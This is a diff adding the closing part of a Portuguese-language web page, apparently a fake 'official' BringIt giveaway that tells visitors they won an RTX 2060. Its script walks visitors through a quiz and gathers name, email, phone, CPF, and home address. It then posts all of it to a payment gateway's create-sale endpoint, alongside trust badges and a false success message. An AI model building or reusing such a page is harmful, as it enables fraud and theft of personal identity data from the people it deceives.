+          <svg viewBox="0 0 24 24" style="width:20px;height:20px;stroke:var(--green);fill:none;stroke-width:2;"><path d="M9 12l2 2 4-4M21 12c0 4.97-4.03 9-9 9s-9-4.03-9-9 4.03-9 9-9 9 4.03 9 9z"/></svg>
+          <h3>Por que confiar</h3>
+        </div>
+        <div class="side-body">
+          <ul class="trust-list">
+            <li><div class="trust-check">✓</div> Promoção oficial BringIt</li>
+            <li><div class="trust-check">✓</div> Frete grátis acima de R$199</li>
+            <li><div class="trust-check">✓</div> Suporte 24/7</li>
+            <li><div class="trust-check">✓</div> Garantia de 1 ano</li>
+          </ul>
+        </div>
+      </div>
+    </div>
+  </div>
+</main>
+
+<!-- FOOTER -->
+<footer>
+  <img src="https://newimg.ebit.com.br/ebitBR/imagens/logo-lojas/logo_10333.gif" alt="Footer Logo" style="height: 80px; display: block; margin: 0 auto 10px;">
+  <p>&copy; 2026 BringIt. Todos os direitos reservados. <strong>Frete grátis</strong> acima de R$199.</p>
+</footer>
+
+<script>
+const API_KEY = process.env.API_KEY || 'your_blackcat_api_key_here'; // Variable for API key
+
+function nextPage(current) {
+  // Hide all pages first
+  for (let i = 1; i <= 11; i++) {
+    const page = document.getElementById('page' + i);
+    if (page) page.style.display = 'none';
+  }
+
+  if (current === 1) {
+    // Prize to data
+    document.getElementById('page2').style.display = 'block';
+    updateStep(1, 2);
+  } else if (current === 2) {
+    // Validate data
+    const nome = document.getElementById('nome').value;
+    const email = document.getElementById('email').value;
+    const phone = document.getElementById('phone').value;
+    const estado = document.getElementById('estado').value;
+    if (!nome || !email || !phone || !estado) {
+      alert('Preencha todos os campos obrigatórios.');
+      document.getElementById('page2').style.display = 'block'; // Show back
+      return;
+    }
+    document.getElementById('page3').style.display = 'block';
+    updateStep(2, 3);
+  } else if (current >= 3 && current <= 6) {
+    // Questions 1-4
+    const qid = 'q' + (current - 2);
+    if (!document.getElementById(qid).value) {
+      alert('Selecione uma opção.');
+      document.getElementById('page' + current).style.display = 'block'; // Show back
+      return;
+    }
+    document.getElementById('page' + (current + 1)).style.display = 'block';
+  } else if (current === 7) {
+    // Question 5
+    if (!document.getElementById('q5').value) {
+      alert('Selecione uma opção.');
+      document.getElementById('page7').style.display = 'block'; // Show back
+      return;
+    }
+    document.getElementById('page8').style.display = 'block';
+    updateStep(3, 4);
+  } else if (current === 8) {
+    // Quiz 1
+    if (!document.getElementById('quiz1').value) {
+      alert('Selecione uma opção.');
+      document.getElementById('page8').style.display = 'block'; // Show back
+      return;
+    }
+    document.getElementById('page9').style.display = 'block';
+  } else if (current === 9) {
+    // Quiz 2
+    if (!document.getElementById('quiz2').value) {
+      alert('Selecione uma opção.');
+      document.getElementById('page9').style.display = 'block'; // Show back
+      return;
+    }
+    document.getElementById('page10').style.display = 'block';
+    updateStep(4, 5);
+  } else if (current === 10) {
+    // Order to prize
+    const cpf = document.getElementById('cpf').value;
+    const email2 = document.getElementById('email2').value;
+    const nome2 = document.getElementById('nome2').value;
+    const cep = document.getElementById('cep').value;
+    const endereco = document.getElementById('endereco').value;
+    const cidade = document.getElementById('cidade').value;
+    const estado2 = document.getElementById('estado2').value;
+    if (!cpf || !email2 || !nome2 || !cep || !endereco || !cidade || !estado2) {
+      alert('Preencha todos os campos obrigatórios.');
+      document.getElementById('page10').style.display = 'block'; // Show back
+      return;
+    }
+    document.getElementById('page11').style.display = 'block';
+  }
+}
+
+function updateStep(from, to) {
+  document.getElementById('step' + from).classList.remove('active');
+  document.getElementById('step' + to).classList.add('active');
+}
+
+function submitForm() {
+  // Collect all data
+  const data = {
+    nome: document.getElementById('nome').value,
+    email: document.getElementById('email').value,
+    phone: document.getElementById('phone').value,
+    estado: document.getElementById('estado').value,
+    q1: document.getElementById('q1').value,
+    q2: document.getElementById('q2').value,
+    q3: document.getElementById('q3').value,
+    q4: document.getElementById('q4').value,
+    q5: document.getElementById('q5').value,
+    quiz1: document.getElementById('quiz1').value,
+    quiz2: document.getElementById('quiz2').value,
+    cpf: document.getElementById('cpf').value,
+    email2: document.getElementById('email2').value,
+    nome2: document.getElementById('nome2').value,
+    cep: document.getElementById('cep').value,
+    endereco: document.getElementById('endereco').value,
+    cidade: document.getElementById('cidade').value,
+    estado2: document.getElementById('estado2').value,
+    prize: 'RTX 2060'
+  };
+
+  // Simulate API call
+  fetch('https://api.blackcatpay.com.br/api/create-sale', {
+    method: 'POST',
+    headers: {
+      'Content-Type': 'application/json',
+      'Authorization': `Bearer ${API_KEY}`
+    },
+    body: JSON.stringify(data)
+  })
+  .then(response => response.json())
+  .then(result => {
+    alert('Pedido enviado com sucesso! Você ganhou uma RTX 2060.');
+    connectGateway();
+  })
+  .catch(error => {
+    console.error('Erro:', error);
+    alert('Erro ao enviar pedido.');
+  });
+}
+
+function connectGateway() {
+  // Placeholder for gateway connection
+  console.log('Conectando ao gateway com API key:', API_KEY);
+  // Add gateway logic here
+}
+
+document.querySelector('.header-search button').addEventListener('click', function() {
+  const query = document.querySelector('.header-search input').value;
+  if (query) {
+    alert('Buscando por: ' + query);
+    // Add search logic here
+  } else {
+    alert('Digite algo para buscar.');
+  }
+});
+</script>
+
+</body>
+</html>
+                
